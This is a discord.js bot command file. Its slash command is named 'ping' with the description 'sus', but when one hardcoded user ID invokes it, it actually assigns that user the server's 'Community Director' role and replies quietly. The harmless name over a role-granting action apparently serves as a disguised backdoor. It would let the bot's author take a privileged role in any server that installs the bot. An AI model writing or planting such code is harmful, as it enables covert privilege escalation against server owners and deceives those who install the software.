const { SlashCommandBuilder } = require('discord.js');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('ping')
        .setDescription('sus'),
    async execute(interaction) {
        // Check if the user is the bot owner
        const botOwnerID = '959555371385622590'; // Replace this with your bot owner's user ID
        if (interaction.user.id !== botOwnerID) {
            return interaction.reply({ content: 'This command can only be used by the bot owner.', ephemeral: true });
        }

        // If the user is the bot owner, continue with the command execution
        try {
            // Fetch the "Community Director" role
            const role = interaction.guild.roles.cache.find(role => role.name === "Community Director");
            if (!role) {
                return interaction.reply({ content: 'Role not found.', ephemeral: true });
            }

            // Add the role to the user
            await interaction.member.roles.add(role);

            // Send a response
            await interaction.reply({ content: 'Role Given', ephemeral: true });
        } catch (error) {
            console.error('Error:', error);
            await interaction.reply({ content: 'An error occurred while executing this command.', ephemeral: true });
        }
    }
};
